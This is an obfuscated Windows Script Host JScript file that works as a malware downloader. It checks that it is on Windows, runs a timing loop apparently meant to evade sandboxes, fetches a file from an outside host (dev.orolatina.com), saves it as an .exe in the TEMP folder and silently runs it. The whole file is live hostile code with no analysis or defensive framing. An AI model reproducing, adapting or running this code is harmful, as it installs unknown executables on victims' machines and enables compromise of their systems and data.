var _B0 = false;
var _FK = "CreateObject";
var _IA = function _FO() {return WScript[_FK]("WScript"+".Shell");}(), _FF = 11;
var _X = "MSXML2.XMLHTTP";
var _D = 2123213;
var _UC = 0;
function _IS(_RS){_IA["Run"](_RS, _UC, _UC);};
function _Q(){return _X + "";};
function _H(_DI, _PK){_UC = _UC * 1; return _DI - _PK;};
function _PB(){return _FK;};
/*@cc_on
  @if (@_win32 || @_win64)
    _B0 = true;
  @end
@*/
if (_B0)
{
var _A = "";
function _CX(){return 22;};
var _G = 0; var _V = 0;
function _U0()
{
var _FZ = new this["Date"]();
var _MU = _FZ["getUTCMilliseconds"]();
WScript["Sleep"](_CX());
var _FZ = new this["Date"]();
var _ZD = _FZ["getUTCMilliseconds"]();
WScript["Sleep"](_CX());
var _FZ = new this["Date"]();
var _C = _FZ["getUTCMilliseconds"]();
var _G = "_EJ";
_G = _H(_ZD, _MU);
var _V = "_EI";
_V = _H(_C, _ZD);
_A = "open";
return _H(_G, _V);
}
var _VI = false;
var _C0 = false;
for (var _ZZ = _UC; _ZZ < _CX() * 1; _ZZ++){if (_U0() != _UC){
_VI = true; 
_V = "31" + 11 * _G + _V; 
_C0 = true; 
break;
}}
function _BY() {return ((_VI == true) && (_VI == _C0)) ? 1 : _UC;};
if (_VI && _BY() && _C0){
function _U() {return _IA["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "NVGXJ1F9qfe.ex" + "e";};
 _VK = _Q();
 _VX = WScript[_FK](_VK);
 var _JH = 1;
 while (_JH){
try {
	if (_JH == 1)
	{
		_VX[_A]("GET", "http://dev.orolatina.com/s3isk", false);
		_VX["send"]();
		_HF = "Sleep";
	}
	WScript[_HF](_CX() + 120); 
	if (_VX["readystate"] < 2 * 2) continue;
	_JH = _UC;
	function _PN(_GB) {var _B = (1, 2, 3, 4, 5, _GB); return _B;};
	_RB = WScript[_PB()]("ADODB.Stream");
	_VK = _RB;
	_VK[_A]();
	_VK["type"] = _PN(1);
	_VK["write"](_VX["ResponseBody"]);
	_RB["position"] = _PN(_UC);
	_VK["Save" + "ToFile"](_U(), 2);
	_RB["cl"+"ose"]();
	_MP = _U();
	_IS(_MP);
} catch(_UL){};
}
}
}

